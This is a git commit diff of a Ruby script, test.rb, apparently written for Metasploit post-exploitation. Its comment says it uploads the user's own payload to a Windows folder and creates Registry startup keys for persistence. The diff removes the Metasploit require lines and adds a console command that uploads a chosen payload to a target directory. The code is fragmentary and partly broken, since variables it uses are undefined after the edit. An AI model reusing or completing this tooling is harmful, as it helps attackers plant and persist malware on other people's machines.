526e97d2d4b3d1f116fa35734d6817ecee21ce41
root <root@localhost.localdomain>
2013-08-13 22:32:06 -0400

    updated

--- test.rb
+++ test.rb
@@ -1,11 +1,5 @@
 #Load our own payload to a directory and create keys in Windows Registery for startup.
 #gcrackem emailchase@gmail.com
-require 'msf/core'
-require 'rex'
-require 'msf/core/post/windows/registry'
-
-#@client = client
-#rhost = Rex::Socket.source_address("1.2.3.4")
 
 puts "Enter the location of your payload [example:] /root/payload.exe"
 payload = gets.chomp
@@ -14,7 +8,7 @@ dir = gets.chomp
 
 if payload != nil
 	puts "Uploading payload from #{payload} to Windows folder #{dir}"
-	puts "#{rhost}"
+	console.run_single("upload #{payload} #{dir}")
 	#write=REX::console.write(testing)
 	#return write
 else
